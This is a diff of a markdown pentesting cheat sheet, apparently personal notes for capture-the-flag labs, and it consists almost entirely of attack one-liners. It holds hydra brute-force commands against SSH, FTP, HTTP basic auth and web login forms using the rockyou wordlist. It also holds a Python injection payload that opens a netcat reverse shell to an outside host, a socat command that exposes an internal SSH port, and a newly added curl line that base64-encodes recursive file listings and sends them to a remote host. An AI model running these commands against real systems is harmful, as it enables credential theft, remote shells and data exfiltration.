@@ -164,6 +164,10 @@ SSH or FTP (swap the last bit by protocol):
 
 `hydra -L users.txt -P passwords.txt 192.168.154.10 ssh`
 
+Basic auth:
+
+`hydra -l rascal -P /usr/share/wordlists/rockyou.txt -f 10.10.238.52 http-get`
+
 Regular login form (for wordpress dont do this, just use wp-scan with the -U, -P options):
 
 `hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.php:username=^USER^&password=^PASS^&login=login:Login failed"`
@@ -212,8 +216,12 @@ If able to inject some python script, e.g. into unsanitised input, this can work
 
 `__import__('os').popen('nc 10.10.106.5 4444 -e /bin/sh').read()`
 
-## Exposing a new port to access something internal
+## Other stuff
 
-E.g. this will expose an internal only port 22 as a public port 8888
+this will expose an internal only port 22 as a public port 8888
 
 `/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22`
+
+this will exfiltrate command outputs if all you have is the ability to make web requests:
+
+`ls -laR ../../../ | base64 -w0 | xargs -I T curl 10.10.149.217:1234/?x=T`
